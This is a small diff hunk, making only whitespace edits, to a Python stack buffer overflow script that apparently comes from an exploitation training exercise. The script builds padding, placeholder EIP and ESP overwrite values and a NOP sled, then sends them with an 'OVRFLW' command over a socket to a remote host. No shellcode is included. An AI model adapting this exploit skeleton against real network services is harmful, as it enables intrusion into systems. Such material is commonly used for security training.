@@ -10,11 +10,9 @@ s.connect((RHOST, RPORT))
 buf = b""
 buf += b"A"*(offset_eip - len(buf))      	# padding
 buf += b"BBBB"                           	# EIP overwrite
-buf += b"\x90"*(offset_esp - offset_eip - 4)   	# Padding between EIP and ESP
+buf += b"\x90"*(offset_esp - offset_eip - 4)# Padding between EIP and ESP
 buf += b"CCCC"                           	# ESP overwrite
 buf += b"D"*(buf_totlen - len(buf))      	# trailing padding
 buf += b"\n"
 
-
 s.send(b"OVRFLW " + buf + b"\n")
-
